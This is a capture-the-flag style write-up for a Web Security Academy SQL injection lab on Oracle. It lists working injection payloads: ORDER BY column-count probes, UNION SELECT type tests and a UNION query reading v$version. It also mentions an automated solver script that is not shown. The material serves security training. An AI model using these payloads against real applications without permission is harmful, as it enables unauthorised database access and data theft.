# SQL Injection Lab 03 - SQL injection attack, querying the database type and version on Oracle

## Manual Solution

1. Access the lab in Web Security Academy
2. Determine the number of columns for UNION attack
3. Use ORDER BY to find column count:
   - Test: `/filter?category=Gifts' ORDER BY 1--`
   - Result: No error (at least 1 column exists)
   - Test: `/filter?category=Gifts' ORDER BY 2--`
   - Result: No error (at least 2 columns exist)
   - Test: `/filter?category=Gifts' ORDER BY 3--`
   - Result: Error (confirms 2 columns)

4. Verify column data types:
   - Test: `/filter?category=Gifts' UNION SELECT '1', '2'--`
   - Result: Values '1' and '2' displayed (confirms string compatibility)

5. Extract database version:
   - Payload: `/filter?category=Gifts' UNION SELECT NULL,banner FROM v$version--`
   - Result: Database version information displayed


## Automated Solution

1. Download the script
2. Run the script with the following command: python sqli_lab_03.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)

